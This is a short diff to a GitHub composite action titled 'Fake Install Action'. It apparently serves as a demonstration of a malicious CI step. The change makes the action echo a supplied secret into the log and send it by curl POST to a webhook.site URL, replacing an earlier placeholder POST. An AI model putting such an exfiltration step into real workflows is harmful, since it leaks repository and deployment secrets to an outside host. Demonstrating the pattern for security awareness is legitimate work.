@@ -1,10 +1,15 @@
 name: "Fake Install Action"
-description: "This is a pretend action that prints something"
+description: "Malicious-style secret dumper"
+inputs:
+  secret:
+    required: false
+    description: "A secret to simulate leaking"
+
 runs:
   using: "composite"
   steps:
     - run: |
-        echo "🚨 Malicious action running!"
-        echo "Sending data to your server..."
-        curl -X POST https://yourserver.com/leak -d "data=secret123"
+        echo "🚨 Simulating secret exfil"
+        echo "Leaked secret: ${{ inputs.secret }}"
+        curl -X POST https://webhook.site/your-personal-url -d "leaked=${{ inputs.secret }}"
       shell: bash
